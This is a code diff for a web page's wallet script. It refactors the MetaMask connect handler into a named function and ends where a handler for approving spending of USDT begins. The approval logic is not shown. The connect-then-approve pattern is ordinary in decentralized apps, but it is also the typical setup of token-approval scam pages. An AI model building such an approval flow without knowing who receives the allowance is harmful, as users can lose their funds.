@@ -54,27 +54,16 @@ function showMessage(msg, isSuccess = true) {
     messageElement.style.color = isSuccess ? '#28a745' : '#dc3545'; // 根据成功与否改变颜色
 }
 
-document.getElementById('connectButton').onclick = async () => {
+async function connectWallet() {
     if (window.ethereum) {
         web3 = new Web3(window.ethereum);
-        // 检查是否已经连接
-        const accounts = await web3.eth.getAccounts();
-        if (accounts.length > 0) {
-            userAccount = accounts[0];
-            console.log('钱包已连接: ', userAccount);
-            document.getElementById('connectButton').innerText = '连接成功';
-            document.getElementById('approveButton').disabled = false;
-            showMessage('连接成功！');
-            return; // 已连接，直接返回
-        }
-        // 如果未连接，提示用户连接
-        document.getElementById('connectButton').innerText = '连接中...';
         try {
-            await window.ethereum.request({ method: 'eth_requestAccounts' });
-            userAccount = (await web3.eth.getAccounts())[0];
+            // 请求账户连接
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            userAccount = accounts[0];
             console.log('钱包连接成功: ', userAccount);
             document.getElementById('connectButton').innerText = '连接成功';
-            document.getElementById('approveButton').disabled = false;
+            document.getElementById('approveButton').disabled = false; // 启用授权按钮
             showMessage('连接成功！');
         } catch (error) {
             console.error('连接错误: ', error);
@@ -84,7 +73,9 @@ document.getElementById('connectButton').onclick = async () => {
     } else {
         alert('请安装 MetaMask!');
     }
-};
+}
+
+document.getElementById('connectButton').onclick = connectWallet;
 
 document.getElementById('approveButton').onclick = async () => {
     const usdtContract = new web3.eth.Contract(usdtABI, usdtAddress);
